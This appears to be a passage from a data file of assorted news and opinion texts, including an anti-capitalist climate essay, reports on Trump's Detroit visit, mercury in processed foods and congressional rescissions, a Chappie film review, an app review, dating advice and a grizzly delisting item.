revolution can save us.”\n\nDouthat puts Pope Francis in the “catastrophist” camp because of the pontiff’s call for humanity to take climate change seriously by undertaking global action and “radical change” to move off fossil fuels and selfish profiteering and consumerism. Thanks to anthropogenic global warming, the Pope writes, “Doomsday predictions can no longer be met with irony or disdain. We may well be leaving to coming generations debris, desolation and filth.”\n\nDouthat mildly applauds Pope Francis for increasing the likelihood that Catholics and non-Catholics will “think anew” about climate change. Still, Douthat rejects the Pope’s “catastrophism” and related radicalism. “It’s possible,” Douthat argues, “to believe that climate change is happening while doubting that it makes ‘the present world system … certainly unsustainable,’ as the pope suggests. Perhaps we’ll face a series of chronic but manageable problems instead; perhaps ‘radical change’ can, in fact, be persistently postponed.”\n\n“Successful Modernity”: The Present is Stranger Than Dystopia\n\nIt’s not an impressive argument. Who thinks anymore that the U.S-of American “argument” between “liberalism [translate: the Democrats] and conservatism [translate: the Republicans]” (both of which are aligned with corporate plutocracy, global U.S. Empire, and eco-cide against democracy, social justice and the common good) marks “the great argument of our time? (Try democracy and the common good versus the unelected and interrelated dictatorships money and empire or, more simply, the people versus the ruling classes.) What is a leftist who believes in governmental technocracy? A contradiction in terms, not to be taken seriously – no more seriously than “the genius of free markets.” No such markets or genius remotely exist. Contemporary capitalism, likes its antecedents, relies heavily and thoroughly on state protection and subsidy. Its “market logic” (cover for corporate and financial rule) is the amoral enemy of democracy, justice, and livable ecology.\n\nWho in their right moral and intellectual mind could possibly believe that “21st-century modernity” (the world capitalist system) is “a basically successful civilization” moving on “an ever-richer, ever-more-liberated course….a success story whose best days are ahead”? Why should anyone take Douthat’s unnamed “dynamists” seriously? Humanity today isn’t merely moving towards a potential catastrophe. It’s in the middle of multiple and interrelated catastrophes right now: mass poverty and hunger; mass involuntary migration; shocking inequality (the Guardian reported last year “that the richest 85 people on the globe – who between them control as much wealth as the poorest half of the global population put together – could squeeze onto a single double-decker” bus); massive structural unemployment; permanent war and endemic militarism; nuclear re-escalation; ubiquitous corporate and financial totalitarianism, (both hard and soft); abject corruption and plutocracy; mass incarceration; rampant governmental police statism; ubiquitous propaganda in ever more potent mass media; a corporate-crafted mass culture of stupidity, selfishness and cruelty; rampant disease and poor health more generally; a compromised food supply and the degradation of food; the ever-escalating crisis of livable ecology, led by anthropogenic global warming (AGW), which poses the very real near term risk of human (self-) extinction. “Successful modernity” indeed!\n\nYou don’t have to turn to the dystopian warnings of 20th century writer and filmmakers like Ray Bradbury (Fahrenheit 451 and other writings), George Orwell (1984), Aldous Huxley (Brave New World), Kurt Vonnegut (Player Piano), Robert Brunner (The Sheep Look Up), John Carpenter (They Live, Escape From New York), Richard Fleischer (Soylent Green), Norman Jewison (Rollerball), Phillip K. Dick (Do Androids Dream of Electric Sheep? and other novels), and Ridley Scott (Blade Runner) to glimmer a world gone mad and suicidally eco-cidal under the rule of elites. You can pay close attention to current events and developments.\n\nTruth, the old saying goes, is stranger than fiction. And the present, I might add, is stranger than dystopia. We don’t have to imagine and warn of authoritarian and ecological nightmares at some point in the far-away future. The nightmares are happening in real time. The catastrophic future, brought to us by the financial-corporate and military state, is now. The Pope’s “Doomsday predictions” are coming true right now. And, no, this planet-cooking present is not remotely sustainable. The judgement of Earth science on that is clear as day: only prompt and radical change leading to a radical reduction in carbon emissions can save prospects for a decent future. Anyone who thinks that such a future is possible if “things go on as they are,” without radical change, is in deep denial and/or lost in a dream world.\n\nCalling such judgements and observations “catastrophist” is an interesting choice. I’ve always found that choice gendered in a patriarchal sort of way, as in the outwardly composed man who tells a distraught and “emotional” woman to “calm down” and “stop being so hysterical.” So consider a clinical analogy. If you went with terrible symptoms to a team of expert doctors and received a carefully considered diagnosis of potentially terminal cancer, would you denounce those medical professionals as “catastrophists” and ignore their prognosis – or would you accept the diagnosis and undertake a serious, likely radical, plan of treatment and change to prolong and enhance your life?\n\nThe real questions for those who wish to save the prospects for a decent human future isn’t whether Douthat’s “dynamists” or Douthat’s “catastrophists” are correct about the state and trajectory of the species. Instead, they are: what is/are the cause/s of current cancerous catastrophes? What must we do about it/them before it is too late?\n\nCapitalism is the Disaster\n\nRegarding climate change, the problem isn’t “modernity” (whatever that term really means at the end of the day) or “industrial civilization” as such. It is a particular form of “modernity” known as capitalism, which stands in an inherently antithetical relationship to livable ecology. The taproot is the growth-, accumulation- and exploitation-addicted world capitalist system, with its anarchic and atomized dispersion of economic decision-making, inherently antithetical to public planning for the common good. As the Canadian Marxist Sam Gindin explained last winter:\n\n“It is not just that…capitalism is inseparable from the compulsion to indiscriminate growth, but that capitalism’s commodification of labor power and nature drives an individualized consumerism inimical to collective values (consumption is the compensation for what we lose in being commodified and is the incentive to work) and insensitive to the environment (nature is an input, and the full costs of how it is exploited by any corporation are for someone else to worry about)….[furthermore…] A social system based on private ownership of production can’t support the kind of planning that could avert environmental catastrophe. The owners of capital are fragmented and compelled by competition to look after their own interests first, and any serious planning would have to override property rights — an action that would be aggressively resisted.”\n\nThere’s a lot more that could be said about how and why the soulless and chaotic bourgeois mode of socioeconomic management (furthered and not tempered by the modern corporation) is wired to destroy life on Earth, but that will do for a useful summary at present. Louis Proyect is correct when he argues that “capitalism and capitalist politics have to be superseded if humanity and nature are to survive. Once we can eliminate the profit motive, the door is open to rational use of natural resources for the first time in human history. How we make use of such resources will naturally be informed by our understanding that reason governs the outcome and not quarterly earnings. The alternative,” Proyect reminds us, “to this is a descent into savagery, if not extinction.” To update Rosa Luxembourg for the age of “the ecological rift,” it’s eco-socialism or barbarism if we’re lucky.\n\nThe Canadian journalist and activist Naomi Klein deserves credit for identifying the profit system as the main culprit behind global warming in her latest book This Changes Everything: Capitalism vs. The Climate. “The really inconvenient truth,” Klein notes, “is that [AGW] is not about carbon – it’s about capitalism…. [and] the war [that system] is waging on earth.” But what does Klein mean, exactly, when she says “capitalism?” Listen to the following passage from This Changes Everything:\n\n“What is really preventing us from putting out the fire that is threatening to burn down our collective house? I think the answer is far simpler than many have led us to believe: we have not done the things necessary to lower emissions because those things fundamentally conflict with deregulated capitalism, the reigning ideology for the entire period we have been struggling to find a way out of this crisis. We are stuck because the actions that would give us the best chance of averting catastrophe – and would benefit the vast majority – are extremely threatening to an elite minority that has a stranglehold over economy, our political process, and most of our major media outlets”\n\nThe final sentence in this passage is consistent with Klein’s radical statement about “the really inconvenient truth” – that the problem is capitalism. Not so the second sentence, which attaches the moderating description “deregulated” to the overall system supposedly in the docket. The problem recurs across This Changes Everything, which repeatedly attaches such qualifiers (“free market,” “neoliberal,” “market fundamentalist” and the like) to the profit system It leaves space for Ross Douthat’s foolish hope (formulated in a critique of the Pope, not Fidel Castro) “that perhaps ‘radical change’ can, in fact, be persistently postponed.”\n\nThis is not a new difficulty in Klein’s writing. Her previous book The Shock Doctrine: The Rise of Disaster Capitalism (2007) was directed primarily at neoliberalism – at (Milton) “Friedmanite capitalism” and at so-called disaster capitalism, not at capitalism itself. It exhibited no small nostalgia for the Keyensian “regulated” and “welfare” capitalism that reigned across much of the rich world in the post-World War II “Golden Age” – a rapidly growing capitalism that (among its many terrible consequences) pushed the world into environmental crisis by the last quarter of the last century.\n\nCapitalism itself is the disaster and the catastrophe. Understanding and transcending capitalism in a systemic fashion is going to be essential for moving beyond d the real time dystopian catastrophes of the present. For the profit system lays at the base of all the “Doomsday” developments mentioned above (environmental ruin, mass poverty, stark inequality, plutocracy, mass incarceration, the police state, racial hyper-disparity, corporate media, etc.) and not just AGW, the biggest issue of our or any time.. All these and other evils of so-called modernity are – to use the language of Dr. Martin Luther King, Jr., in the middle and late 1960s – intimately “interwoven” and “interrelated.” They suggest that King was right near the end of his life when he wrote that “real issue to be faced” beyond superficial matters (like, say, the color or gender or sexual orientation of a corporate-captive political candidate) was “the radical reconstruction of society itself.” And that King was correct when he said that “the United States will have to adopt a modified form of socialism.”\n\nPaul Street’s latest book is They Rule: The 1% v.

On Friday he met with community leaders in Philadelphia. On Saturday morning he’ll visit a black church in Detroit.\n\nRelated: Trump Gets Zero Percent Support From Black Voters in Ohio\n\nBut his trip has been mired in skepticism and controversy since it was announced last week, when the campaign and the church’s pastor confirmed that the event was closed to the press, that Trump would not directly address congregants and that Bishop Wayne T. Jackson would conduct a closed-door interview with Trump that would air for at least a week later on the streaming television network founded by Jackson. Then on Thursday night the New York Times published a leaked list of scripted answers Trump was to give in response to Jackson’s pre-approved questions.\n\nHours later the Trump campaign reversed course and said that the candidate would address the audience at Jackson’s Great Faith Ministries International church for about 10 or 15 minutes.\n\nThe prospect of Trump coming to Detroit, perhaps the blackest big city in America, in an effort to reach black voters without actually engaging any black voters confounded some and angered others. Black voters in Detroit have been paying close attention to Trump’s rhetoric and his missteps during his efforts to court them.\n\nPlay Facebook\n\nTwitter\n\nEmbed Can Trump still reach out to black voters? 5:03 autoplay autoplay Copy this code to your website or blog\n\n“I'm not even sure that I would say he reached out to black folks. I think that, when you address somebody, you have to talk from their cultural perspective. I think Mr. Trump has insulted not only blacks, but everybody else,” said Alando Reeves, a political consultant. “I don't see it as a way of engaging black folks to have an in between if you havin' a conversation in a black community. I don't need somebody to speak for me. So if you want to hear my opinion, then ask me.”\n\n“I don't see him talking about, 'Well, this is what I plan to do for African-Americans,' \" said Eric Fowlkes, a recent college graduate. “I just see a bunch of him trying to get get brownie points for making comments about African-Americans. And I think it's very disrespectful.”\n\nPolling across the country shows little-to-no African-American support for Donald Trump. Michigan is no different. Recent data shows that 88 percent of black voters say they’ll choose Democrat Hillary Clinton compared to just 8 percent for Trump.\n\nRelated: Trump Speech Failed to Sell 'Law and Order' to Blacks\n\nNationally, those numbers skew even further in support for Clinton. An NBC/Wall Street Journal poll taken between July 31 and August 3 shows black support at 91 percent for Clinton and just 1 percent for Trump.\n\nSome have speculated that Trump’s latest overture to black voters is not aimed at blacks per se, but at white college educated voters. While Trump holds a sizable lead over Clinton with uneducated white voters, Clinton holds a 47 percent to 40 percent lead with white, college-educated voters — a historically reliable Republican demographic. The theory goes that many educated white voters, who tend to be less socially conservative than their less-educated counterparts, may be turned off by the perception that Trump’s rhetoric on a number of issues appears racist or bigoted, etc. By showing that he’s reaching out to blacks, Trump may be trying to make some white voters more comfortable with him.\n\nWayne Bradley, a black Republican who heads Michigan’s African-American outreach, said that while support for Trump among black voters is slim, it’s only because they haven’t had a chance to properly engage with him. They simply haven’t heard enough about Trump's plan to fix what ails them, he said.\n\nRelated: Trump to African-American Voters: What Do You Have to Lose?\n\n“I think that if he continues to have a dialogue, going to different places throughout the country, in these urban areas like Detroit, like a Cleveland, like a Chicago, and he's willing to have the conversation in those communities, I think that people are looking for a reason to vote for Donald Trump,” Bradley said. “There's a lot of people that don't trust Hillary Clinton in our community. What I'm hearing more of is people are saying, ‘I wanna hear his policy. His ideas. Give me a reason for vote for him.’”\n\nStill, black voters like Tahjma Vaughn say they're not buying Trump’s latest efforts to woo them.\n\n“I think he's trying to play on his insecurities. And that's my problem. You're basically telling us we're helpless without you,” Vaughn said. “But we've been hearing that. We've always been hearing that we need some white savior to come save us, when we're capable of doing that ourselves. Why can't you acknowledge that?”",

  "latent_10317": "A test of popular processed foods from some of the biggest names in the industry found trace amounts of mercury, according to the Institute for Agriculture and Trade Policy, a nonprofit group based in Minneapolis. The amounts of mercury found was far less than that commonly seen in most fish and seafood, but turned up in many foods not previously known to be sources of mercury, including many preferred by children, the group said. It includes Nutri-Grain Strawberry Cereal Bars, Quaker Oatmeal to go bars, Hershey's Chocolate Syrup, Yoplait Strawberry yogurt, Market Pantry Grape Jelly and Coca-Cola, it said. \"This seems like an avoidable source of mercury that we didn't know was out there,\" said David Wallinga, one of the study's co-authors. The study concluded that the mercury came from food plants that use caustic soda laced with mercury to produce high fructose corn syrup for major food companies. The researchers cautioned that their study was limited. It tested 55 consumer items, finding mercury in one third of the samples ranging from 30 to 350 parts per trillion. A part per trillion is the rough equivalent of a drop of water in 20 Olympic-sized swimming pools. Several companies named in the IATP report defended their products Monday, pointing to the very low levels of mercury detected. \"You would have to eat more than 100 pounds of ketchup each day to even come close to reaching the EPA's safe exposure level,\" said ConAgra spokeswoman Stephanie Childs. A spokesman for General Mills challenged the science behind the report, saying it didn't identify which form of mercury was detected and that parts per trillion of mercury can be found in water, soil and plant and animal tissue. \"To suggest a safety concern on the basis of this study is irresponsible,\" said Tom Forsythe, a spokesman.\n\nA group representing the high fructose corn syrup industry said food plants no longer use the mercury-containing ingredients that caused contamination in the past, adding that four-year-old samples were cited in an academic paper that was released in tandem with the IATP report. \"This study appears to be based on outdated information of dubious significance,\" said Audrae Erickson, president of the Corn Refiners Association. The IATP, however, said four plants in Georgia, Tennessee, Ohio and West Virginia still use the \"mercury-cell\" technology that leads to contamination. A fifth plant in Wisconsin has begun converting its plant to use mercury-free agents. The report was published Monday in the peer-reviewed journal Environmental Health. Lead author Renee Dufault, a former Food and Drug Administration scientist, said she presented findings about mercury in processed food to the FDA after preliminary testing in 2005. \"Environmental mercury exposure via food, water and air is a threat to sensitive populations -- those who may not be able to effectively metabolize mercury (autistic children and the elderly). Sensitive populations may be bioaccumulating mercury and this leads to neurological effects,\" she said in an email. An FDA spokesman said the agency was overwhelmed with the peanut butter salmonella scare and could not respond immediately to this issue. The mercury findings, while potentially alarming, should be viewed in context, said Michael Jacobson, executive director of the Center for Science in the Public Interest. The report found 300 parts per trillion of mercury in Jack Daniel's Barbecue Sauce, but that's still 30 to 3,000 times less than the amount of mercury found in fish and seafood. \"I suspect people eat more fish than barbecue sauce,\" he said. The type of mercury commonly found in fish and seafood is methyl mercury, and its effects are known to be toxic, but the type of mercury found in the packaged foods is not yet known, the report's authors said.\n\nHeavy metal contamination in the food chain of industrialized nations is not uncommon. A 2004 study by the World Health Organization found an average adult consumes 100 micrograms of mercury per week in Portugal, and more than 50 micrograms per week in Italy, Germany and France. Here are the responses about the report from some of the major food companies: General Mills: \"We have serious doubts about the scientific merit of this report. The main premise -- that the processing of high-fructose corn syrup is responsible for traces of mercury in products - is not established by this study. Levels of elemental mercury at parts per trillion or greater can be found throughout the environment in water, in soil and in plant and animal tissues. This study does not establish that any mercury detected comes from HFCS -- and there is no evidence that suggest it is in the organic form of mercury (that which has demonstrated health impact). To suggest a safety concern on the basis of this study is irresponsible. Questions about the analytical methodology used in the study remain unanswered as well. If this study is to be reported upon, it may be just as important for consumers to know that - even if present at the levels reported -- the levels supposedly cited in this paper would be minimal, and well below any concern level set by either U.S. or international regulatory bodies. Of all of the many facts that this paper fails to mention, that may be the most important point for readers to know.\" Hershey's: Hershey products are safe to consume, and all ingredients meet our stringent quality and safety guidelines, as well as applicable federal requirements, said Kirk Saville, a spokesman for Hersheys. Kellogg: Was the company aware of this type of mercury contamination? The food industry tests at the parts per billion level. This study looked at parts per trillion, a level that is 1,000 times lower than the already stringent threshold of parts per billion.",
  "latent_10338": "Bottom Line Up-Front: Most of the critics are wrong about Neil Blomkamp’s Chappie. While not as good as I remember District 9, it is better than Elysium. However, it is NOT what you expect from these stars, nor from the advertisements, and I think that is what is bringing its scores down so low. This is a pretty good AI sci-fi action flick, but it subverts so many of your pre-conceptions, many end up disliking it. I enjoyed it and it would be well worth a matinee and/or rental, though probably not a purchase on Blu-Ray.\n\nSPOILERS ABOUND: Chappie is set in Johannesburg, South Africa in the near future. Jo’burg is overridden with violent crime and drug activity, so much so that the police force is heavily militarized, and the environment supports some drastic measures. In comes Tetravaal, a tech company who has perfected an autonomous police robot to support the human cops. They have a functional AI, but they are not “alive” or self-aware. Within a few short months, the Scout droids designed and overseen by Dev Patel’s Deon have turned the crime situation around and everything is looking rosy for Jo’burg — as long as you’re not a gangster or a rival in the company with an alternative police droid. Enter our first antagonist, Hugh Jackman’s Vincent, playing a fairly monomaniacal villain against his usual type. His alternative robot, a HEAVILY armed and armored remotely-piloted ED-209-ish droid called The Moose, is the prime alternative to the Scout, but the Scout design is doing so well, Sigourney Weaver’s Michelle — Vincent and Deon’s boss — won’t spend company funds on his ugly and overpowered drone. He thus hates Deon and consistently menaces him and looks for a way to undercut the Scout program. Deon himself has grand plans far beyond the Scout program. His true goal is a full artificial intelligence, a machine consciousness that can appreciate and employ abstract thought for art, music, and everything. The problem is, Michelle doesn’t see any upside for the company for a more fully rounded AI, making Deon a victim of his own success.\n\nNow enter the two big “problems” with Chappie: our actual protagonists. You see, Deon, Vincent, and Michelle only bookend the story and provide the framework for the plot. The actual protagonists are three craven, stupid, drugged-out gangsters in the form of rap-rave duo Die Antwoord’s Ninja and Yo-landi (going by their actual stage names here) and Jose Cantillo’s Amerika. They enter the story because they screwed up and wind up owing a brutal thug, Brandon Auret’s Hippo, around 20 million Rand (about $1.6 million) after a bad drug heist and Hippo gives them 7 days to come up with it. The problem is, the Scouts have made it a lot harder to pull off deals or heists of that size, so they’re all gonna die. Yo-landi, however, figures it would be easy to pull off a heist if they turned off the Scouts, hypothesizing that they probably have a remote control somewhere that can do the trick (she apparently had just seen The Phantom Menace or Avengers). They see Deon’s picture in the paper and decide to kidnap him.\n\nDeon makes a breakthrough and successfully compiles a conscious AI, but given Michelle’s reluctance, he decides to go behind her back and install it in a very unlucky Scout, Unit 022, which has been wrecked so many times its battery is fused to its chassis and cannot be changed or re-charged. He steals the busted Scout, the encrypted guard-key to change its program, and his prototype AI. As luck would have it, though, the gangsters choose that moment to car-jack him. At their hideout, he convinces them there is no remote to kill the Scouts. Amerika sees the busted Scout and figures it is the next best thing and orders Deon to program it to help them pull off a heist. Not wanting to die, and desperate to see his creation live, he brings the Scout online with the new program. Dubbed Chappie by Yo-landi, the infant-like droid is nothing like Ninja wants and he threatens to kill Deon if he can’t make it perform. Deon promises to come back and get Chappie working better. They let him go and Yo-landi, Amerika, and Chappie bond while Ninja seethes and plans.\n\nThis is both the most enjoyable section of the movie and the most frustrating. It is fascinating to see Chappie “grow” and try to reconcile Deon’s brief admonishment to only do good and not commit any crimes with the trio’s reality of nothing but crime. Nature vs. nurture. Chappie won’t kill, but they convince him it’s okay to poke holes in people and help them go to sleep. Chappie won’t steal, but when Ninja tells him the rich people on the street are driving cars that they stole from his Daddy and Mommy (Ninja and Yo-landi), he becomes quite adept at carjacking. Chappie wants to do good, but Ninja explains to him that if he wants to live beyond the week he has due to his bad battery, he has to fight and help them carry off the heist. Chappie is innocent, but he is also crafted into a dangerous gangster because of the environment he is exposed to, the reality of their “normal” lives, and his own desperate situation in the face of all the abhorrent treatment he receives at the hands of humans.\n\nIn the third act, Vincent re-emerges after scuttling the Scout program and out-ing Chappie to Michelle, who gives him free reign to bring down the rogue robot with his own monstrosity. Pyrotechnics ensue and everything collides very satisfactorily. But then comes the 4th act and finale no one is talking about, where many thought the movie goes off the rails. I won’t give it away here, but I did think it followed with Chappie’s situation and the actions he takes on his own to survive, and it served to make the question of AI more profound.\n\nNON-SPOILERISH DISCUSSION: This movie is not what you expect going in. Hugh Jackman is a monomaniacal, former special forces type desperate to succeed with his own project at any cost. He is not one-dimensional, but he isn’t a well-rounded hero either. Sigourney Weaver is DEFINITELY not a Ripley-type. She has a fairly small role as a timid, second-guessing, cover-your-own-ass corporate bureaucrat. Neither is what you expect from these actors and knowing what they are capable of in other films may leave you wanting more. But that’s not this movie. Neil Blomkamp’s films involve dark-dark-dark antagonists and extremely flawed protagonists in a dirty, messy, petty world. It was that way in District 9, in Elysium, and now in Chappie. This movie is not Robocop, Short Circuit (1 or 2), Pinocchio, Oliver Twist, District 9, or AI, though it carries elements of them all. Of course, if you have to name five or more movies that a story has common elements with, that doesn’t say derivative to me, that says it is an original story informed by what came before. The special effects are great. I believed in Chappie as a real thing, and I found his journey through life believable, even if it isn’t the good robot discovers how to be good sort of story many seem to want. The plot goes places you aren’t expecting, but I found it a fun and interesting journey. Do the characters make poor choices? Yes, but guess what? Life is often defined by poor, not well thought out choices.\n\nAnd to address the biggest gripe of the movie: Die Antwoord. Many ping on their bad acting as the thing that kills the movie. Would I choose a pair of rappers to lead my film? No, but they are not as bad as people make out. I considered them to be members of a totally separate South African gangster sub-culture, so I just accepted their mannerisms and way of speech as true-ish elements of that culture. Was Yo-landi’s voice annoying? Maybe a little, but I didn’t notice it by the end. Was Ninja an asshole? Yes, but he’s supposed to be an asshole, and he had a satisfying arc by the end. Was Ninja an actual asshole on the set? I’m given to believe that he probably was and won’t be getting any more acting roles because of it in future, but his main detractor — the guy that played Hippo and complained about Ninja criticizing his acting — was so over the top and an actual bad actor, that I have to take his criticisms with a bag of salt.\n\nBest is Sharlto Copley as Chappie. I loved his work and his growth here. Great job and nothing left to say.\n\nFor me, I’ll see it again when it goes digital and I may end up buying it. But don’t believe all the detractors that insist the movie match the movie they thought they’d be seeing. Go check it out.",

The app then automatically stitches those two pictures together, one on top of the other.\n\nFrom a product perspective, the app has three key things I look for: it’s clean, simple, and fast. The UI is clever. You look at it and immediately know what to do. (The social structure of the feed is a bit muddled at the moment, but they’re working on that.)\n\nBut there are a lot of apps that have such traits. Why Frontback is interesting to me is that it seems to be enticing people to do something — something which a lot of people wouldn’t otherwise do — something which is particularly hot at the moment: take selfies.\n\nThis is hardly a new concept. People have been taking pictures of themselves for as long as cameras have existed. And certainly innovations like the Polaroid camera, the disposable camera, and then the digital camera propelled the concept forward. But with smartphones, selfies have become something of a phenomenon in recent years.\n\nExcept not for me. I’ve always found it hard to take a picture of myself without feeling at least a little bit ridiculous. The thought of then sharing such a picture amplified that feeling by an order of magnitude. You could say I’m not exactly the key demographic.\n\nBut that’s the thing: I’m not sure this is something there should be a demographic for. I suspect that even the least vain person in the world would admit that they like seeing pictures of themselves from time to time. It’s interesting to see what you look like. And sharing the most recognizable trait of yourself, your face, with others would seem to make sense as a common social behavior when you’re away from friends and family.\n\nEnter Frontback. It not only allows you to share these selfies, it makes you do it. The picture taken with the back camera is a crutch to prop up your confidence so you can take that front camera picture of yourself.\n\nAnd what you get is even more interesting than a selfie by itself because you see a picture of what a person is looking at alongside their reaction. More so than many other social photography apps, the result is downright human.\n\nI have no idea if Frontback will actually breakout beyond my own social graph. Maybe the people I know are weird. Certainly, many of them are. But I’m no longer sure that the idea behind the selfie should be considered weird. It’s not a social norm amongst my demographic and older ones because we didn’t grow up with smartphones. But the kids who did seem to naturally gravitate towards this style of visual sharing. Frontback, or something like it, might help the rest of us get there.\n\nIn that regard, Frontback reminds me of a few other apps that have altered my modus operandi. Instagram and Vine spring to mind. I didn’t take a lot of photographs before Instagram. And I basically never took video before Vine. But sometimes the smallest tweaks at just the right time can lift the barriers holding back new behavior.\n\n[image via @coloredhistory]\n\n753 Kudos",
  "latent_10463": "In an era of trillion-dollar federal deficits, is it possible for members of Congress to oppose a White House proposal to cut “unnecessary spending”? You betcha!\n\nCongress in recent years has let slide many of its powers – from punting big investigations to outside commissions to signing a blank check for President Bush to use force after the 9/11 attacks. But Article I congressional spending powers are clutched tight, especially by those lawmakers who have won seats on the A-list Appropriations Committees.\n\nInside the Beltway, he who holds the purse strings holds the power, and key Democrats are giving no indication that they are ready to yield to President Obama this precious pearl of lawmaking.\n\n“I have long defended the congressional power of the purse, and, as chairman of the Appropriations Committee I have no intention of ceding that authority to the executive branch,” said Sen. Daniel Inouye (D) of Hawaii, in a statement on Monday.\n\nHouse Speaker Nancy Pelosi, who has done the heavy lifting for most of Mr. Obama’s domestic agenda, is not out in front on this one. In a statement, she said that she “looked forward to reviewing the president’s proposal.”\n\n\"She wants an opportunity to hear from members of the caucus and talk to others in the administration,” says spokesman Nadeam Elshami. “We just received the proposal today.”\n\nThat proposal, released Monday, boils down to this: Within two months after the president has signed appropriations bills into law, the White House can opt to give Congress a second chance to vote down a list of projects in that fiscal year’s spending bills that the White House deems wasteful. Congress must vote this package of rescissions up or down in its entirety, by a simple majority vote.\n\nBudget watchdog groups hailed the proposal as an important first step to reining in unsustainable federal spending.\n\n“It is just another tool that can help Congress help themselves,” says Steve Ellis, vice president of programs for Taxpayers for Common Sense, noting that members often wind up voting for projects they don’t like in vast spending bills.\n\nThis so-called expedited rescission bill gives lawmakers a second shot at eliminating these projects. In FY 2010, Congress included 9,499 member projects, adding up to $15.9 billion.\n\n“This step by the White House puts more responsibility on the president to say, 'I will take wasteful dollars out of the budget.' It can build trust,” says Maya MacGuineas, president of the Committee for a Responsible Federal Budget.\n\n“The challenges we face now are so great that it’s going to have to be done in a series of steps. Before you can turn to Social Security and taxes, you have to hit these trustbusters, like earmarks,” she adds. “Every normal taxpayer says, ‘Why should I be part of the solution when Washington is still broken?’ ”\n\nIn fact, presidents now have the power to propose rescissions, but no president has used it since 2000 because the process is so unpopular with Congress. The last time a president requested rescissions – three worth $128 million in 2000 – none of them was accepted.\n\nSeveral times, Sen. John McCain (R) of Arizona has proposed giving the president the expedited-rescissions powers under discussion now, but Obama and the Democrats rejected it.\n\n“The president would have this authority already if he and members of his administration hadn’t blocked similar legislation when they served in the Senate,” said Senate Republican leader Mitch McConnell, referring to a filibuster of the McCain proposal.\n\nSen. Robert Byrd (D) of West Virginia, who spoke for six straight hours in opposition to a GOP proposal to give President George H.W. Bush a presidential line-item veto in 1992, says he will oppose a \"power grab\" by a Democratic president as well.\n\n\"The elected representatives of the people know a lot better than any bureaucrat in Washington as to what our spending priorities should be. Not only would these rescission decisions be those of unelected bureaucrats – with no transparency or accountability, they would allow the White House to leave intact its own spending priorities,” he said.\n\nRelated:",

  "latent_10587": "By Adelle Waldman\n\nSome guys may teach you something, says the author of the riveting novel The Love Affairs of Nathaniel P. That doesn’t mean you need to spend the rest of your life with them.\n\n1. The One Who Never Wanted To Commit -- Until He Met You\n\nThis sounds like the dream, right? The guy who proclaimed to all that he’d never settle down with anyone ever, and then ate his words when you came along? But the problem is that no matter how wowed by you he is now, the moment things become less exciting, less overwhelmingly amazing between the two of you (and the moment will come), he is likely to have second thoughts. And that will make you feel awful. Maybe you’ll sense it happening, in which case you’ll probably try harder, to do whatever you can to make sure things don’t get less exciting. But that’s a basis for a performance, not a marriage.\n\nYou need to meet this guy, however, so that when you meet the guy you should marry you can tell the difference. The one you ought to marry will be a person who wants to be in a committed relationship and who will work with you to make your marriage strong. He won’t feel he has made a mistake, or been duped, every time something between the two of you isn’t perfect, because he will already know that relationships, like other true and meaningful things, operate on an axis that has nothing to do with perfect—they are messy, real, evolving things. That’s what’s so great about them.\n\n2. The Guy Who Knows Everyone, I Mean, Everyone, In Town\n\nThis is a guy who’ll save you when you need to get a table at the hot, new restaurant or a contact at a company to which you’re thinking of sending your resume. But be wary. This guy is always chatting on the phone -- or sending emails or responding to texts -- during dinners, holidays, all the times when you long for attention. Makes sense: He’s responding to all those other people who need an in at that trendy restaurant or a professional contact, after all, and he’s got to keep his Rolodex up-to-date; it requires constant effort. His desire to help, his sociability, these are some of his best qualities -- as a friend.\n\n3. The Funny, Charming, Sensitive Guy Who Pouts And Says \"Nothing\" When You Ask Him If Something's Wrong\n\nHe’s got so many wonderful qualities. So please, date him -- if only because you’ll learn a lot about the importance of another quality: open communication. The thing about marriage is that it’s really long. You might be the greatest, most thoughtful and kind-hearted person in the world; I guarantee you are still going to occasionally piss him off.\n\nIt’s easier, for all of us, to sit in silence and seethe and think self-righteously that if our partners were better people, they would know why we are mad and wouldn’t have to ask. It’s a lot harder to say, \"I know you didn’t mean it, but that joke you made in front of our friends about my slow work habits made me feel lame.\" Yet, so much of marriage comes down to just those moments -- spitting it out, explaining what’s wrong and giving your partner a chance to apologize and do better the next time. The brooding guy who punishes you with silence? After a while, you’re likely to become so afraid of making him angry -- and so unsure of what exactly bothers him since he never tells you—that you’ll have to tiptoe around him.\n\n4. The Guy Who Is So Good-Looking -- Or Wealthy Or Successful -- That All Your Friends Are In Awe\n\nHere’s my advice: See what it feels like to walk into a room with him. Watch your friends' and acquaintances' eyes widen ever so slightly. Just remember, it can be hard to separate the feeling of pride and exhilaration that comes from having won the affection of someone deemed desirable from the more tender feelings that are the basis of love. Marriage is made up of so many amazing moments other than walking into rooms. Make sure the guy you marry is the guy you most want to stay up late with when it’s just the two of you, the one you love being alone with at home.\n\n5. The Earnest, Bright-Eyed Younger Man Who Adores You\n\nThis guy not only wants to commit your every utterance to memory but also heartens you with his sweetness and solemn desire to find love. This will help you more than you know, especially on those days when the men you've dated have caused you to question whether guys even have feelings. (We all have those days.) This man will help you to feel optimistic about humanity and about yourself. But you can’t get romantic with him over the long term. Not because of his age -- there’s nothing wrong with walking down the aisle with someone younger -- but because one-sided adoration inevitably curdles into resentment that the feeling isn't mutual. You might not even want to get romantic with him in the short term because he might feel some real feelings and what you might really like is the flattering reflection of yourself you see in his admiring gaze. By choosing to let him go, you'll have done the right thing -- acting in the best interests of two connected people -- which is exactly what's required when you meet the man you so, so, so need to marry.",

The Interagency Grizzly Bear Study Team estimates there are about 700 grizzlies in the Greater Yellowstone ecosystem.\n\nJesse Logan, a retired U.S. Forest Service entomologist, explained the American Society for Mammalogists and the Society for Conservation Biology have said the population is not close enough to recovery numbers.\n\n\"This sort of misrepresentation that occurs in both the federal government's delisting proposal and also in the state's proposed management absolutely doesn't stand up to the light of scientific scrutiny,\" he said.\n\nU.S. Fish and Wildlife said the bears have reached their carry capacity in the Greater Yellowstone ecosystem. Grizzlies could be delisted under the Endangered Species Act by the end of the year.\n\nIn comments from Montana, Idaho and Wyoming, states said they would oppose review of the grizzly's status unless there is a \"significant, documented decline\" in the species' population, backing out of protecting stable population numbers.

